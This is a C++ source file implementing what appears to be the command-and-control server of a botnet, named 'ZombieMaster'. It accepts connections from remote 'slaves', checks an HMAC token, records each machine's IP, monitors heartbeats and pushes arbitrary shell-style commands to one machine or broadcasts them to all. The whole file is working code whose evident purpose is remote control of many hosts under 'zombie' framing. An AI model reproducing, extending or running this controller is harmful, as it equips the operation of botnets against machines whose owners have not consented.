#include "zombie/master.hpp"

#include <iostream>
#include <thread>
#include <chrono>
#include <cstring>
#include <ctime>
#include <openssl/hmac.h>
#include <openssl/sha.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>

namespace nonail {

ZombieMaster::ZombieMaster(const std::string& password,
                           const std::string& host, int port)
    : password_(password), host_(host), port_(port)
{}

ZombieMaster::~ZombieMaster() {
    stop();
}

void ZombieMaster::stop() {
    running_ = false;
}

bool ZombieMaster::authenticate(const std::string& token) const {
    unsigned char digest[SHA256_DIGEST_LENGTH];
    unsigned int len = 0;

    auto colon = token.find(':');
    if (colon == std::string::npos) return false;

    std::string ts_str = token.substr(0, colon);
    std::string provided_hmac = token.substr(colon + 1);

    long ts = std::stol(ts_str);
    long now = static_cast<long>(std::time(nullptr));
    if (std::abs(now - ts) > 60) return false;

    HMAC(EVP_sha256(),
         password_.data(), static_cast<int>(password_.size()),
         reinterpret_cast<const unsigned char*>(ts_str.data()),
         ts_str.size(), digest, &len);

    char hex[SHA256_DIGEST_LENGTH * 2 + 1];
    for (unsigned i = 0; i < len; ++i)
        snprintf(hex + i * 2, 3, "%02x", digest[i]);
    hex[len * 2] = '\0';

    return std::string(hex) == provided_hmac;
}

std::string ZombieMaster::recv_until(int fd, const std::string& marker) const {
    std::string buffer;
    char buf[4096];

    while (true) {
        // Poll with 10s timeout
        struct pollfd pfd{fd, POLLIN, 0};
        int ret = poll(&pfd, 1, 10000);
        if (ret <= 0) break;  // timeout or error

        ssize_t n = recv(fd, buf, sizeof(buf) - 1, 0);
        if (n <= 0) break;
        buf[n] = '\0';
        buffer += buf;

        if (buffer.find(marker) != std::string::npos) {
            // Strip the marker
            auto pos = buffer.find(marker);
            buffer = buffer.substr(0, pos);
            break;
        }
    }
    return buffer;
}

std::vector<SlaveInfo> ZombieMaster::list_slaves() const {
    std::lock_guard<std::mutex> lock(slaves_mutex_);
    std::vector<SlaveInfo> result;
    for (auto& [id, info] : slaves_) {
        result.push_back(info);
    }
    return result;
}

std::string ZombieMaster::send_command(const std::string& slave_id, const std::string& command) {
    std::lock_guard<std::mutex> lock(slaves_mutex_);
    auto it = slaves_.find(slave_id);
    if (it == slaves_.end()) return "Slave not found: " + slave_id;
    if (it->second.fd < 0) return "Slave " + slave_id + " disconnected";

    int fd = it->second.fd;
    std::string msg = command + "\n";
    ssize_t sent = send(fd, msg.c_str(), msg.size(), 0);
    if (sent < 0) {
        it->second.status = "disconnected";
        it->second.fd = -1;
        return "Send failed to " + slave_id;
    }

    return recv_until(fd, "\n---END---\n");
}

void ZombieMaster::broadcast(const std::string& command) {
    auto slaves_copy = list_slaves();
    for (auto& info : slaves_copy) {
        if (info.fd >= 0) send_command(info.id, command);
    }
}

void ZombieMaster::heartbeat_loop() {
    while (running_) {
        std::this_thread::sleep_for(std::chrono::seconds(30));
        auto now = static_cast<double>(std::time(nullptr));
        {
            std::lock_guard<std::mutex> lock(slaves_mutex_);
            for (auto it = slaves_.begin(); it != slaves_.end();) {
                if (now - it->second.last_seen > 90.0) {
                    std::cout << "💀 Slave " << it->first << " timed out\n";
                    if (it->second.fd >= 0) close(it->second.fd);
                    it = slaves_.erase(it);
                } else {
                    ++it;
                }
            }
        }
    }
}

void ZombieMaster::handle_connection(int client_fd) {
    // Update last_seen on slave activity
    // This runs in a detached thread and just keeps the fd open
    // The slave's fd is stored in slaves_ and commands are pushed by send_command
    // We just drain any unsolicited messages (PONG etc.)
    char buf[256];
    while (running_) {
        struct pollfd pfd{client_fd, POLLIN, 0};
        int ret = poll(&pfd, 1, 5000);
        if (ret < 0) break;
        if (ret > 0) {
            ssize_t n = recv(client_fd, buf, sizeof(buf) - 1, MSG_PEEK);
            if (n <= 0) break;  // disconnected
            // Update last_seen
            std::lock_guard<std::mutex> lock(slaves_mutex_);
            for (auto& [id, info] : slaves_) {
                if (info.fd == client_fd) {
                    info.last_seen = static_cast<double>(std::time(nullptr));
                    break;
                }
            }
        }
    }

    // Mark slave as disconnected
    {
        std::lock_guard<std::mutex> lock(slaves_mutex_);
        for (auto& [id, info] : slaves_) {
            if (info.fd == client_fd) {
                info.status = "disconnected";
                info.fd = -1;
                std::cout << "🔌 Slave " << id << " disconnected\n";
                break;
            }
        }
    }
    close(client_fd);
}

void ZombieMaster::run() {
    running_ = true;

    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        std::cerr << "Failed to create socket\n";
        return;
    }

    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(static_cast<uint16_t>(port_));
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_fd, reinterpret_cast<struct sockaddr*>(&addr), sizeof(addr)) < 0) {
        std::cerr << "Failed to bind on port " << port_ << "\n";
        close(server_fd);
        return;
    }

    listen(server_fd, 16);
    std::cout << "🧟 Zombie Master listening on port " << port_ << "\n";

    std::thread hb(&ZombieMaster::heartbeat_loop, this);
    hb.detach();

    while (running_) {
        struct pollfd pfd{server_fd, POLLIN, 0};
        int ret = poll(&pfd, 1, 1000);
        if (ret <= 0) continue;

        struct sockaddr_in client_addr{};
        socklen_t client_len = sizeof(client_addr);
        int client_fd = accept(server_fd, reinterpret_cast<struct sockaddr*>(&client_addr), &client_len);
        if (client_fd < 0) continue;

        char ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &client_addr.sin_addr, ip, sizeof(ip));
        std::cout << "🔌 Connection from " << ip << "\n";

        // Read auth token (first line)
        char buf[1024];
        ssize_t n = recv(client_fd, buf, sizeof(buf) - 1, 0);
        if (n <= 0) { close(client_fd); continue; }
        buf[n] = '\0';

        std::string token(buf);
        while (!token.empty() && (token.back() == '\n' || token.back() == '\r'))
            token.pop_back();

        if (!authenticate(token)) {
            std::cout << "❌ Auth failed from " << ip << "\n";
            send(client_fd, "AUTH_FAIL\n", 10, 0);
            close(client_fd);
            continue;
        }

        // Read slave ID (second message after AUTH_OK)
        send(client_fd, "AUTH_OK\n", 8, 0);

        n = recv(client_fd, buf, sizeof(buf) - 1, 0);
        if (n <= 0) { close(client_fd); continue; }
        buf[n] = '\0';
        std::string slave_id(buf);
        while (!slave_id.empty() && (slave_id.back() == '\n' || slave_id.back() == '\r'))
            slave_id.pop_back();

        {
            std::lock_guard<std::mutex> lock(slaves_mutex_);
            SlaveInfo info;
            info.id = slave_id;
            info.ip = ip;
            info.status = "connected";
            info.last_seen = static_cast<double>(std::time(nullptr));
            info.fd = client_fd;
            slaves_[slave_id] = info;
        }
        std::cout << "✅ Slave registered: " << slave_id << " (" << ip << ")\n";

        // Keep connection alive in a monitor thread
        std::thread monitor(&ZombieMaster::handle_connection, this, client_fd);
        monitor.detach();
    }

    close(server_fd);
}

} // namespace nonail
